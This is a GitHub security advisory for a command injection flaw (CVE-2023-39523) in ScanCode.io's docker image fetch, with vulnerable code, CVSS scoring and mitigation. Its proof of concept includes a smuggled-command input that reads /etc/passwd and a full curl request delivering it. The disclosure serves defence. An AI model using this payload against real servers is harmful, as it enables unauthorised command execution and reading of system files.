{
    "Title": "ScanCode.io command injection in docker image fetch process",
    "Meta": {
        "Package": [
            "scancodeio([pip](/advisories?query=ecosystem%3Apip))"
        ],
        "Affected versions": [
            "<= 32.5.0"
        ],
        "Patched versions": [
            "32.5.1"
        ]
    },
    "Description": "## Command Injection in docker fetch process\n\n### Summary\n\nA possible command injection in the docker fetch process as it allows to\nappend malicious commands in the docker_reference parameter.\n\n### Details\n\nIn the function `scanpipe/pipes/fetch.py:fetch_docker_image`[1] the parameter\n`docker_reference` is user controllable. The `docker_reference` variable is\nthen passed to the vulnerable function `get_docker_image_platform`.\n\n    \n    \n    def fetch_docker_image(docker_reference, to=None):\n        \"\"\"\n        code snipped ....\n        \"\"\"\n        platform_args = []\n        platform = get_docker_image_platform(docker_reference) # User controlled `docker_reference` passed\n       \"\"\"\n       code snipped...\n       \"\"\"\n\nHowever, the `get_docker_image_plaform` function constructs a shell command\nwith the passed `docker_reference`. The `pipes.run_command` then executes the\nshell command without any prior sanitization, making the function vulnerable\nto command injections.\n\n    \n    \n    def get_docker_image_platform(docker_reference):\n        \"\"\"\n        Return a platform mapping of a docker reference.\n        If there are more than one, return the first one by default.\n        \"\"\"\n        skopeo_executable = _get_skopeo_location()\n        \"\"\"\n        Constructing a shell command with user controlled variable `docker_reference`\n        \"\"\"\n        cmd = (\n            f\"{skopeo_executable} inspect --insecure-policy --raw --no-creds \"\n            f\"{docker_reference}\"\n        )\n    \n        logger.info(f\"Fetching image os/arch data: {cmd}\")\n        exitcode, output = pipes.run_command(cmd) # Executing command\n        logger.info(output)\n        if exitcode != 0:\n            raise FetchDockerImageError(output)\n\nA malicious user who is able to create or add inputs to a project can inject\ncommands. Although the command injections are blind and the user will not\nreceive direct feedback without logs, it is still possible to cause damage to\nthe server/container. The vulnerability appears for example if a malicious\nuser adds a semicolon after the input of `docker://;`, it would allow\nappending malicious commands.\n\n### PoC\n\n  1. Create a new project with following input `docker://;echo${IFS}\"PoC\"${IFS}&&cat${IFS}/etc/passwd` in the filed Download URLs  \n[![image](https://user-\nimages.githubusercontent.com/122313513/258454691-7cabe100-f82d-44b9-99f2-5d6a0949e6c4.png)](https://user-\nimages.githubusercontent.com/122313513/258454691-7cabe100-f82d-44b9-99f2-5d6a0949e6c4.png)\n\n  2. Check docker logs to see the command execution  \n[![image](https://user-\nimages.githubusercontent.com/122313513/258455082-d7590b16-6fcb-4041-949f-2e20959db713.png)](https://user-\nimages.githubusercontent.com/122313513/258455082-d7590b16-6fcb-4041-949f-2e20959db713.png)\n\n    \n    \n    curl -i -s -k -X $'POST' \\\n        -H $'Host: localhost' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: multipart/form-data; boundary=---------------------------2742275543734015476190112060' -H $'Content-Length: 923' -H $'Origin: http://localhost' -H $'DNT: 1' -H $'Connection: close' -H $'Referer: http://localhost/project/add/' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' \\\n        -b $'csrftoken=7H2chgA7jPHnXK0NNPftIoCW9z8SabKR' \\\n        --data-binary $'-----------------------------2742275543734015476190112060\\x0d\\x0aContent-Disposition: form-data; name=\\\"csrfmiddlewaretoken\\\"\\x0d\\x0a\\x0d\\x0ayslGuNnvWloFUEUCWI5VlMuZ60ZDDSkFvZdIBTNs50VSHeKfznaeT0WL5pXlDTUm\\x0d\\x0a-----------------------------2742275543734015476190112060\\x0d\\x0aContent-Disposition: form-data; name=\\\"name\\\"\\x0d\\x0a\\x0d\\x0apoc\\x0d\\x0a-----------------------------2742275543734015476190112060\\x0d\\x0aContent-Disposition: form-data; name=\\\"input_files\\\"; filename=\\\"\\\"\\x0d\\x0aContent-Type: application/octet-stream\\x0d\\x0a\\x0d\\x0a\\x0d\\x0a-----------------------------2742275543734015476190112060\\x0d\\x0aContent-Disposition: form-data; name=\\\"input_urls\\\"\\x0d\\x0a\\x0d\\x0adocker://;echo${IFS}\\\"PoC\\\"${IFS}&&cat${IFS}/etc/passwd\\x0d\\x0a-----------------------------2742275543734015476190112060\\x0d\\x0aContent-Disposition: form-data; name=\\\"pipeline\\\"\\x0d\\x0a\\x0d\\x0a\\x0d\\x0a-----------------------------2742275543734015476190112060\\x0d\\x0aContent-Disposition: form-data; name=\\\"execute_now\\\"\\x0d\\x0a\\x0d\\x0aon\\x0d\\x0a-----------------------------2742275543734015476190112060--\\x0d\\x0a' \\\n        $'http://localhost/project/add/'\n\n**Mitigations**  \nThe `docker_reference` input should be sanitized to avoid command injections\nand it is not recommend to create commands with user controlled input\ndirectly.\n\n**Tested on:**\n\n  * Commit: Latest commit [bda3a70e0b8cd95433928db1fd4b23051bc7b7eb]\n  * OS: Ubuntu Linux Kernel 5.19.0\n\n**References**  \n[1]\n<https://github.com/nexB/scancode.io/blob/main/scanpipe/pipes/fetch.py#L185>\n\n### References\n\n  * [GHSA-2ggp-cmvm-f62f](https://github.com/nexB/scancode.io/security/advisories/GHSA-2ggp-cmvm-f62f \"GHSA-2ggp-cmvm-f62f\")\n  * <https://nvd.nist.gov/vuln/detail/CVE-2023-39523>\n  * [nexB/scancode.io@`07ec0de`](https://github.com/nexB/scancode.io/commit/07ec0de1964b14bf085a1c9a27ece2b61ab6105c)\n  * <https://github.com/nexB/scancode.io/blob/main/scanpipe/pipes/fetch.py#L185>\n  * <https://github.com/nexB/scancode.io/releases/tag/v32.5.1>\n\n",
    "Severity": {
        "Score": "6.8/ 10 (Moderate)",
        "CVSS base metrics": {
            "Attack vector": "Adjacent",
            "Attack complexity": "Low",
            "Privileges required": "Low",
            "User interaction": "None",
            "Scope": "Unchanged",
            "Confidentiality": "Low",
            "Integrity": "Low",
            "Availability": "High"
        },
        "CVSS string": "CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:H"
    },
    "Weaknesses": [
        "[CWE-77](/advisories?query=cwe%3A77)"
    ],
    "CVE ID": "CVE-2023-39523",
    "GHSA ID": "GHSA-2ggp-cmvm-f62f",
    "Source code": "[nexB/scancode.io](https://github.com/nexB/scancode.io)"
}